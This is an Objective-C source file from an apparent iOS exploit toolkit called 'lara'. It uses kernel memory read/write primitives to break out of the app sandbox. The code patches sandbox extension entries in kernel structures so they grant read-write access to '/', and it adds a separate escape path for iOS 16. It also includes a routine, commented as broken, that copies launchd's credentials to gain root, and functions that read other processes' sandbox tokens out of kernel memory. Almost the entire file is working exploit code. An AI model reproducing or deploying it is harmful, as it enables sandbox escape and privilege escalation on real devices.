//
//  sbx.m
//  lara
//
//  Created by ruter on 05.04.26.
//

#import <Foundation/Foundation.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <dlfcn.h>
#include <string.h>
#include <stdarg.h>
#include <limits.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <mach/machine.h>

#include "sbx.h"
#include "utils.h"
#include "darksword.h"

#define MAC_SYS_SANDBOX_EXTENSION_ISSUE 461

extern int64_t sandbox_extension_consume(const char *extension_token);

typedef void (*sbx_log_callback_t)(const char *message);
static sbx_log_callback_t g_sbx_log = NULL;

void sbx_setlogcallback(sbx_log_callback_t callback) {
    g_sbx_log = callback;
}

static void sbx_log(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void sbx_log(const char *fmt, ...) {
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (g_sbx_log) g_sbx_log(buf);
    NSLog(@"%s", buf);
}

#define KRW_LEN 0x20

#define OFF_PROC_PROC_RO       0x18
#define OFF_PROC_COMM          0x56c
#define OFF_PROC_RO_UCRED      0x20
#define OFF_UCRED_CR_LABEL     0x78
#define OFF_LABEL_SANDBOX      0x10
#define OFF_SANDBOX_EXT_SET    0x10
#define OFF_EXT_DATA           0x40
#define OFF_EXT_DATALEN        0x48

extern uint64_t VM_MIN_KERNEL_ADDRESS;
extern uint64_t t1sz_boot;
extern uint64_t pac_mask;

static bool ispac(void) {
    cpu_subtype_t cpusubtype = 0;
    size_t sz = sizeof(cpusubtype);
    if (sysctlbyname("hw.cpusubtype", &cpusubtype, &sz, NULL, 0) != 0) {
        return false;
    }
    return cpusubtype == CPU_SUBTYPE_ARM64E;
}

static inline uint64_t xpaci(uint64_t a) {
    if (!ispac()) return a;
    if ((a & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) return a;

    register uint64_t x0 asm("x0") = a;
    asm volatile(".long 0xDAC143E0" : "+r"(x0)); // XPACI X0
    return x0;
}

static inline uint64_t signptr(uint64_t v) {
    if ((v >> 32) > 0xFFFF) return v | pac_mask;
    return v;
}

#define S(x) ({ uint64_t _v = xpaci(x); signptr(_v); })
#define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)

static uint64_t smrdecode(uint64_t value, uint64_t base) {
    uint64_t bits = (base << (62 - (uint8_t)t1sz_boot));
    if ((value & bits) == 0) {
        return ((value & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
    }
    return (value & 0xFFFFFFFFFFFFFFE0ULL);
}

static uint64_t kreadsmrguess(uint64_t raw) {
    uint64_t pac = S(raw);
    if (K(pac)) return pac;

    uint64_t d2 = smrdecode(pac, 2);
    if (K(d2)) return d2;

    uint64_t d3 = smrdecode(pac, 3);
    if (K(d3)) return d3;

    return pac;
}

static void patchext(uint64_t ext) {
    uint64_t da = ds_kread64(ext + OFF_EXT_DATA);
    uint64_t dl = ds_kread64(ext + OFF_EXT_DATALEN);
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        ds_kread(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;
        ds_kwrite(da, buf, KRW_LEN);
    }
    uint8_t chunk[KRW_LEN];
    ds_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    *(uint64_t*)(chunk + 0x08) = 1;
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    ds_kwrite(ext + OFF_EXT_DATA, chunk, KRW_LEN);
}

static int patchchain(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {
        uint64_t ext = S(ds_kread64(hdr + 0x8));
        if (K(ext)) { patchext(ext); n++; }
        uint64_t next = ds_kread64(hdr);
        if (!next || !K(next)) break;
        hdr = S(next);
    }
    return n;
}

static void setrwclass(uint64_t hdr) {
    uint64_t ext = S(ds_kread64(hdr + 0x8));
    if (!K(ext)) return;
    uint64_t da = ds_kread64(ext + OFF_EXT_DATA);
    if (!K(da)) return;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
    memcpy(b1, rw, KRW_LEN);
    ds_kwrite(da + 32, b1, KRW_LEN);
    ds_kwrite(da + 64, b2, KRW_LEN);

    uint8_t hb[KRW_LEN];
    ds_kread(hdr, hb, KRW_LEN);
    *(uint64_t*)(hb + 0x10) = da + 32;
    ds_kwrite(hdr, hb, KRW_LEN);
}

uint64_t sbx_ucredbyproc(uint64_t proc) {
    if (!proc) {
        sbx_log("ourproc is NULL");
        return 0;
    }

    uint64_t proc_ro_raw = ds_kread64(proc + OFF_PROC_PROC_RO);
    uint64_t proc_ro = S(proc_ro_raw);
    sbx_log("proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", proc, proc_ro_raw, proc_ro);

    if (!K(proc_ro)) {
        sbx_log("proc_ro invalid");
        return 0;
    }

    sbx_log("scanning proc_ro for ucred...");
    uint64_t ucred = 0;
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = ds_kread64(proc_ro + off);
        uint64_t smr = kreadsmrguess(raw);
        uint64_t pac = S(raw);
        sbx_log("  proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);

        if (K(smr)) {
            uint64_t maybe_label = S(ds_kread64(smr + OFF_UCRED_CR_LABEL));
            if (K(maybe_label)) {
                uint64_t maybe_sandbox = S(ds_kread64(maybe_label + OFF_LABEL_SANDBOX));
                if (K(maybe_sandbox)) {
                    sbx_log("found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
                    ucred = smr;
                    break;
                }
            }
        }
        if (!ucred && K(pac)) {
            uint64_t maybe_label = S(ds_kread64(pac + OFF_UCRED_CR_LABEL));
            if (K(maybe_label)) {
                uint64_t maybe_sandbox = S(ds_kread64(maybe_label + OFF_LABEL_SANDBOX));
                if (K(maybe_sandbox)) {
                    sbx_log("found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
                    ucred = pac;
                    break;
                }
            }
        }
    }
    
    if (!K(ucred)) {
        sbx_log("ucred not found in proc_ro");
        return 0;
    }

    return ucred;
}

static bool ios16_system(void);
static int ios16_sbx_escape(uint64_t self_proc);

int sbx_escape(uint64_t self_proc) {
    if (ios16_system()) {
        return ios16_sbx_escape(self_proc);
    }

    if (!self_proc) {
        sbx_log("ds_get_our_proc() returned 0x0 — trying ourproc() fallback...");
        self_proc = ourproc();
    }

    if (!self_proc) {
        sbx_log("ourproc() failed after PID/socket-based self-proc recovery");
    }

    uint64_t ucred = sbx_ucredbyproc(self_proc);
    if (!ucred) {
        sbx_log("failed to obtain ucred");
        return -1;
    }

    uint64_t label = S(ds_kread64(ucred + OFF_UCRED_CR_LABEL));
    if (!K(label)) {
        sbx_log("cr_label invalid");
        return -1;
    }

    uint64_t sandbox = S(ds_kread64(label + OFF_LABEL_SANDBOX));
    if (!K(sandbox)) {
        sbx_log("sandbox invalid");
        return -1;
    }

    uint64_t ext_set = S(ds_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    if (!K(ext_set)) {
        sbx_log("ext_set invalid");
        return -1;
    }

    sbx_log("ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx", ucred, label, sandbox, ext_set);

    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(ds_kread64(ext_set + s * 8));
        if (K(hdr)) patched += patchchain(hdr);
    }
    sbx_log("patched %d extensions", patched);

    int classed = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(ds_kread64(ext_set + s * 8));
        if (K(hdr) && K(ds_kread64(hdr + 0x10))) { setrwclass(hdr); classed++; }
    }
    sbx_log("changed %d extension classes", classed);

    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = S(ds_kread64(ext_set + s * 8));
        if (K(h)) src = h;
    }
    if (src) {
        int filled = 0;
        for (int s = 0; s < 16; s++) {
            uint64_t h = ds_kread64(ext_set + s * 8);
            if (!h || !K(h)) { ds_kwrite64(ext_set + s * 8, src); filled++; }
        }
        sbx_log("filled %d empty hash slots", filled);
    }

    int fd_w = open("/var/mobile/.rooootwashere", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.rooootwashere"); }

    if (fd_w >= 0) {
        sbx_log("escaped!");
        return 0;
    }

    sbx_log("sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
    return -1;
}

// broken
int sbx_elevate(void) {
    uint64_t launchd = procbyname("launchd");
    if (!launchd && islcruntime()) {
        launchd = procbypid(1);
        if (launchd) {
            sbx_log("resolved launchd via pid 1 fallback: 0x%llx", launchd);
        }
    }
    if (!launchd) {
        sbx_log("could not find launchd");
        return -1;
    }
    
    uint64_t launchducred = sbx_ucredbyproc(launchd);
    if (!launchducred) {
        sbx_log("failed to get valid ucred from launchd");
        return -1;
    }
    sbx_log("launchd ucred: 0x%llx", launchducred);
    
    uint64_t self_proc = ds_get_our_proc();
    if (!self_proc && islcruntime()) {
        sbx_log("ds_get_our_proc() returned 0x0 during elevate; trying ourproc() fallback...");
        self_proc = ourproc();
    }
    if (!self_proc) {
        sbx_log("failed to get our proc");
        return -1;
    }
    sbx_log("ourproc: 0x%llx", self_proc);
    
    uint64_t ourucredraw = ds_kread64(self_proc + 0x10);
    uint64_t ourucred = S(ourucredraw);
    sbx_log("ourucred: 0x%llx", ourucred);
    
    ds_kwrite64(self_proc + 0x10, launchducred);
    
    if (getuid() == 0) {
        sbx_log("elevate success!");
        return 0;
    }
    
    sbx_log("elevate failed, uid: %d", getuid());
    return -1;
}

uint64_t sbx_gettoken(pid_t pid) {
    sbx_log("attempting proc lookup...");
    sleep(2);

    uint64_t proc = procbypid(pid);
    sbx_log("proc result = 0x%llx", proc);

    if (!proc) {
        sbx_log("(%d) failed to find process", pid);
        return 0;
    }

    sbx_log("attempting ucred lookup...");
    sleep(2);

    uint64_t ucred = sbx_ucredbyproc(proc);
    sbx_log("ucred = 0x%llx", ucred);

    if (!ucred) {
        sbx_log("(%d) failed to get ucred", pid);
        return 0;
    }

    sbx_log("reading cr_label...");
    sleep(2);

    uint64_t label_addr = ucred + OFF_UCRED_CR_LABEL;
    sbx_log("label addr = 0x%llx", label_addr);

    uint64_t label = S(ds_kread64(label_addr));
    sbx_log("label = 0x%llx", label);

    if (!K(label)) {
        sbx_log("(%d) invalid cr_label", pid);
        return 0;
    }

    sbx_log("reading sandbox pointer...");
    sleep(2);

    uint64_t sandbox_addr = label + OFF_LABEL_SANDBOX;
    sbx_log("sandbox addr = 0x%llx", sandbox_addr);

    uint64_t sandbox = S(ds_kread64(sandbox_addr));
    sbx_log("sandbox = 0x%llx", sandbox);

    if (!K(sandbox)) {
        sbx_log("(%d) no sandbox", pid);
        return 0;
    }

    sbx_log("reading ext_set...");
    sleep(2);

    uint64_t extset_addr = sandbox + OFF_SANDBOX_EXT_SET;
    sbx_log("ext_set addr = 0x%llx", extset_addr);

    uint64_t ext_set = S(ds_kread64(extset_addr));
    sbx_log("ext_set = 0x%llx", ext_set);

    if (!K(ext_set)) {
        sbx_log("(%d) invalid ext_set", pid);
        return 0;
    }

    sbx_log("scanning ext_set slots...");
    sleep(2);

    for (int i = 0; i < 16; i++) {

        uint64_t slot_addr = ext_set + (i * 8);
        sbx_log("  [slot %d] hdr addr = 0x%llx", i, slot_addr);
        sleep(1);

        uint64_t hdr = S(ds_kread64(slot_addr));
        sbx_log("  [slot %d] hdr = 0x%llx", i, hdr);

        if (!K(hdr)) {
            sbx_log("  [slot %d] invalid hdr", i);
            continue;
        }

        uint64_t ext_ptr_addr = hdr + 0x8;
        sbx_log("  [slot %d] ext ptr addr = 0x%llx", i, ext_ptr_addr);
        sleep(1);

        uint64_t ext = S(ds_kread64(ext_ptr_addr));
        sbx_log("  [slot %d] ext = 0x%llx", i, ext);

        if (!K(ext)) continue;

        uint64_t data_ptr = S(ds_kread64(ext + OFF_EXT_DATA));
        sbx_log("  [slot %d] token buffer ptr = 0x%llx", i, data_ptr);
        sleep(1);

        char token[0x400];
        memset(token, 0, sizeof(token));

        if (K(data_ptr)) {
            ds_kread(data_ptr, token, sizeof(token) - 1);
        }

        sbx_log("  [slot %d] token = %s", i, token);

        return data_ptr;
    }

    sbx_log("no valid token found");
    return 0;
}

char *sbx_copytoken(pid_t pid) {
    uint64_t proc = procbypid(pid);
    if (!proc) return NULL;

    uint64_t ucred = sbx_ucredbyproc(proc);
    if (!ucred) return NULL;

    uint64_t label = S(ds_kread64(ucred + OFF_UCRED_CR_LABEL));
    if (!K(label)) return NULL;

    uint64_t sandbox = S(ds_kread64(label + OFF_LABEL_SANDBOX));
    if (!K(sandbox)) return NULL;

    uint64_t ext_set = S(ds_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    if (!K(ext_set)) return NULL;

    for (int i = 0; i < 16; i++) {
        uint64_t hdr = S(ds_kread64(ext_set + (i * 8)));
        if (!K(hdr)) continue;

        uint64_t ext = S(ds_kread64(hdr + 0x8));
        if (!K(ext)) continue;

        uint64_t data_ptr = S(ds_kread64(ext + OFF_EXT_DATA));
        uint64_t data_len = ds_kread64(ext + OFF_EXT_DATALEN);
        if (!K(data_ptr) || data_len == 0) continue;

        size_t max_len = 0x2000;
        size_t read_len = (size_t)data_len;
        if (read_len > max_len) read_len = max_len;

        char *out = calloc(1, read_len + 1);
        if (!out) return NULL;

        ds_kread(data_ptr, out, read_len);
        out[read_len] = 0;
        return out;
    }

    return NULL;
}

void sbx_freestr(char *s) {
    free(s);
}

typedef char *(*sandbox_extension_issue_file_t)(const char *extension_class, const char *path, int flags);
typedef void (*sandbox_extension_free_t)(char *token);

char *sbx_issue_token(const char *extension_class, const char *path) {
    if (!extension_class || !path) return NULL;

    void *h = dlopen("libsandbox.dylib", RTLD_NOW);
    if (!h) h = dlopen("/usr/lib/libsandbox.dylib", RTLD_NOW);
    if (!h) return NULL;

    sandbox_extension_issue_file_t issue =
        (sandbox_extension_issue_file_t)dlsym(h, "sandbox_extension_issue_file");
    if (!issue) return NULL;

    char *token = issue(extension_class, path, 0);
    if (!token) return NULL;

    char *copy = strdup(token);

    sandbox_extension_free_t sfree = (sandbox_extension_free_t)dlsym(h, "sandbox_extension_free");
    if (sfree) {
        sfree(token);
    } else {
        free(token);
    }

    return copy;
}

#pragma mark - iOS 16

#define IOS16_OFF_SANDBOX_EXT_TABLE 0x08
#define IOS16_OFF_EXT_META          0x50
#define IOS16_BUCKET_COUNT          18
#define IOS16_TARGET_PATH           "/"
#define K_ios16(x) ds_isvalid((uint64_t)(x))

static bool ios16_system(void) {
    NSOperatingSystemVersion version = [[NSProcessInfo processInfo] operatingSystemVersion];
    return version.majorVersion == 16;
}

static bool ios16_write64_in_block(uint64_t addr, uint64_t value) {
    uint64_t base = addr & ~(uint64_t)(KRW_LEN - 1);
    uint64_t off = addr - base;
    if (off + sizeof(uint64_t) > KRW_LEN) {
        return false;
    }

    uint8_t buf[KRW_LEN];
    ds_kread(base, buf, KRW_LEN);
    *(uint64_t *)(buf + off) = value;
    ds_kwritezoneelement(base, buf, KRW_LEN);
    return true;
}

static bool ios16_class_name_is(uint64_t class_ptr, const char *expected) {
    if (!K_ios16(class_ptr) || !expected) return false;

    size_t len = strlen(expected);
    if (len > 32) len = 32;

    char got[33] = {0};
    for (size_t off = 0; off < len; off += 8) {
        uint64_t q = ds_kread64(class_ptr + off);
        size_t n = len - off;
        if (n > 8) n = 8;
        memcpy(got + off, &q, n);
    }
    return memcmp(got, expected, len) == 0;
}

static bool ios16_class_name_known(uint64_t class_ptr) {
    return ios16_class_name_is(class_ptr, "com.apple.sandbox.container") ||
           ios16_class_name_is(class_ptr, "com.apple.sandbox.executable") ||
           ios16_class_name_is(class_ptr, "com.apple.app-sandbox.read") ||
           ios16_class_name_is(class_ptr, "com.apple.app-sandbox.read-write") ||
           ios16_class_name_is(class_ptr, "com.apple.app-sandbox.write");
}

static bool ios16_ext_table_looks_valid(uint64_t table) {
    if (!K_ios16(table)) return false;

    for (int bucket = 0; bucket < IOS16_BUCKET_COUNT; bucket++) {
        uint64_t node = S(ds_kread64(table + (uint64_t)bucket * 8));
        for (int depth = 0; depth < 8 && K_ios16(node); depth++) {
            uint64_t next_node = S(ds_kread64(node + 0x00));
            uint64_t ext = S(ds_kread64(node + 0x08));
            uint64_t class_ptr = S(ds_kread64(node + 0x10));
            if (ios16_class_name_known(class_ptr) && K_ios16(ext)) {
                uint64_t path = S(ds_kread64(ext + OFF_EXT_DATA));
                uint64_t len = ds_kread64(ext + OFF_EXT_DATALEN);
                if (K_ios16(path) && len > 0 && len < PATH_MAX) {
                    return true;
                }
            }
            if (!next_node || next_node == node) break;
            node = next_node;
        }
    }

    return false;
}

static uint64_t ios16_extension_table(uint64_t sandbox) {
    uint64_t table = S(ds_kread64(sandbox + IOS16_OFF_SANDBOX_EXT_TABLE));
    if (ios16_ext_table_looks_valid(table)) {
        return table;
    }

    table = S(ds_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    if (ios16_ext_table_looks_valid(table)) {
        return table;
    }

    return 0;
}

static char *ios16_issue_token(const char *extension_class, const char *path) {
    if (!extension_class || !path) return NULL;

    void *h = dlopen("libsandbox.dylib", RTLD_NOW);
    if (!h) h = dlopen("/usr/lib/libsandbox.dylib", RTLD_NOW);
    if (!h) return NULL;

    typedef char *(*issue_to_self_t)(const char *, const char *, int);
    typedef char *(*issue_file_t)(const char *, const char *, int);
    typedef void (*free_token_t)(char *);

    issue_to_self_t issue_to_self = (issue_to_self_t)dlsym(h, "sandbox_extension_issue_file_to_self");
    issue_file_t issue_file = (issue_file_t)dlsym(h, "sandbox_extension_issue_file");

    char *token = NULL;
    if (issue_to_self) {
        token = issue_to_self(extension_class, path, 0);
    }
    if (!token && issue_file) {
        token = issue_file(extension_class, path, 0);
    }
    if (!token) return NULL;

    char *copy = strdup(token);
    free_token_t free_token = (free_token_t)dlsym(h, "sandbox_extension_free");
    if (free_token) {
        free_token(token);
    } else {
        free(token);
    }
    return copy;
}

static int64_t ios16_seed_path(NSString *path) {
    if (path.length == 0) return -1;

    const char *classes[] = {
        "com.apple.app-sandbox.read-write",
        "com.apple.app-sandbox.read",
        "com.apple.app-sandbox.write",
    };

    const char *cpath = path.fileSystemRepresentation;
    for (size_t i = 0; i < sizeof(classes) / sizeof(classes[0]); i++) {
        char *token = ios16_issue_token(classes[i], cpath);
        if (!token) continue;

        int64_t handle = sandbox_extension_consume(token);
        free(token);
        return handle;
    }

    return -1;
}

static int64_t ios16_seed_probe(void) {
    @autoreleasepool {
        NSArray<NSString *> *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *docs = dirs.firstObject ?: NSHomeDirectory();
        NSString *probe = [docs stringByAppendingPathComponent:@"lara-sbx-probe"];
        if (probe.length == 0) return -1;

        [[NSFileManager defaultManager] createDirectoryAtPath:probe
                                  withIntermediateDirectories:YES
                                                   attributes:nil
                                                        error:nil];
        return ios16_seed_path(probe);
    }
}

static bool ios16_find_extension(uint64_t sandbox, const char *class_name, int64_t handle, bool any_handle, uint64_t *out_ext) {
    if (out_ext) *out_ext = 0;
    uint64_t table = ios16_extension_table(sandbox);
    if (!K_ios16(table)) return false;

    for (int bucket = 0; bucket < IOS16_BUCKET_COUNT; bucket++) {
        uint64_t node = S(ds_kread64(table + (uint64_t)bucket * 8));
        for (int node_depth = 0; node_depth < 8 && K_ios16(node); node_depth++) {
            uint64_t next_node = S(ds_kread64(node + 0x00));
            uint64_t ext = S(ds_kread64(node + 0x08));
            uint64_t class_ptr = S(ds_kread64(node + 0x10));
            if (ios16_class_name_is(class_ptr, class_name)) {
                for (int ext_depth = 0; ext_depth < 8 && K_ios16(ext); ext_depth++) {
                    uint64_t next_ext = S(ds_kread64(ext + 0x00));
                    uint64_t ext_handle = ds_kread64(ext + 0x08);
                    if (any_handle || (int64_t)ext_handle == handle) {
                        if (out_ext) *out_ext = ext;
                        return true;
                    }
                    if (!next_ext || next_ext == ext) break;
                    ext = next_ext;
                }
            }
            if (!next_node || next_node == node) break;
            node = next_node;
        }
    }

    return false;
}

static bool ios16_path_has_prefix(uint64_t addr, const char *prefix) {
    if (!K_ios16(addr) || !prefix) return false;

    size_t len = strlen(prefix);
    char got[PATH_MAX] = {0};
    if (len >= sizeof(got)) return false;

    for (size_t off = 0; off < len; off += 8) {
        uint64_t q = ds_kread64(addr + off);
        size_t n = len - off;
        if (n > 8) n = 8;
        memcpy(got + off, &q, n);
    }

    return memcmp(got, prefix, len) == 0;
}

static bool ios16_set_extension_path(uint64_t ext, const char *target) {
    uint64_t path = S(ds_kread64(ext + OFF_EXT_DATA));
    if (!K_ios16(path) || !target) return false;

    uint64_t target_len = (uint64_t)strlen(target);
    uint64_t first = path & ~(uint64_t)(KRW_LEN - 1);
    uint64_t end = path + target_len + 1;
    if (!K_ios16(first)) return false;

    for (uint64_t base = first; base < end; base += KRW_LEN) {
        uint8_t block[KRW_LEN];
        ds_kread(base, block, KRW_LEN);
        for (uint64_t addr = base; addr < base + KRW_LEN; addr++) {
            if (addr < path || addr >= end) continue;
            uint64_t idx = addr - path;
            block[addr - base] = (idx < target_len) ? (uint8_t)target[idx] : 0;
        }
        ds_kwritezoneelement(base, block, KRW_LEN);
    }

    bool wrote_len = ios16_write64_in_block(ext + OFF_EXT_DATALEN, target_len);
    return wrote_len && ds_kread64(ext + OFF_EXT_DATALEN) == target_len && ios16_path_has_prefix(path, target);
}

static bool ios16_test_root_access(void) {
    DIR *dir = opendir(IOS16_TARGET_PATH);
    if (dir) closedir(dir);

    int fd = open("/private/var/mobile/Library/Preferences/lara-sbx-access.txt", O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) return false;

    const char marker[] = "lara-sbx-test\n";
    ssize_t written = write(fd, marker, sizeof(marker) - 1);
    close(fd);
    int unlinked = unlink("/private/var/mobile/Library/Preferences/lara-sbx-access.txt");
    return dir != NULL && written == (ssize_t)(sizeof(marker) - 1) && unlinked == 0;
}

static int ios16_sbx_escape(uint64_t self_proc) {
    if (!self_proc) {
        self_proc = ourproc();
    }
    if (!self_proc) {
        sbx_log("iOS16 sandbox escape failed: no self proc");
        return -1;
    }

    uint64_t ucred = sbx_ucredbyproc(self_proc);
    if (!ucred) return -1;

    uint64_t label = S(ds_kread64(ucred + OFF_UCRED_CR_LABEL));
    if (!K_ios16(label)) return -1;

    uint64_t sandbox = S(ds_kread64(label + OFF_LABEL_SANDBOX));
    if (!K_ios16(sandbox)) return -1;

    int64_t probe_handle = ios16_seed_probe();
    if (probe_handle < 0) {
        sbx_log("iOS16 sandbox escape failed: no probe extension");
        return -1;
    }

    uint64_t probe_ext = 0;
    uint64_t container_ext = 0;
    if (!ios16_find_extension(sandbox, "com.apple.app-sandbox.read-write", probe_handle, false, &probe_ext) || !K_ios16(probe_ext)) {
        sbx_log("iOS16 sandbox escape failed: probe extension not found");
        return -1;
    }
    if (!ios16_find_extension(sandbox, "com.apple.sandbox.container", 0, true, &container_ext) || !K_ios16(container_ext)) {
        sbx_log("iOS16 sandbox escape failed: container extension not found");
        return -1;
    }

    if (!ios16_write64_in_block(probe_ext + OFF_EXT_DATALEN, 1)) {
        return -1;
    }

    uint64_t container_meta = ds_kread64(container_ext + IOS16_OFF_EXT_META);
    if (!ios16_write64_in_block(probe_ext + IOS16_OFF_EXT_META, container_meta)) {
        return -1;
    }

    if (!ios16_set_extension_path(probe_ext, IOS16_TARGET_PATH)) {
        return -1;
    }

    if (!ios16_test_root_access()) {
        sbx_log("iOS16 sandbox escape verification failed");
        return -1;
    }

    sbx_log("iOS16 sandbox escape succeeded");
    return 0;
}
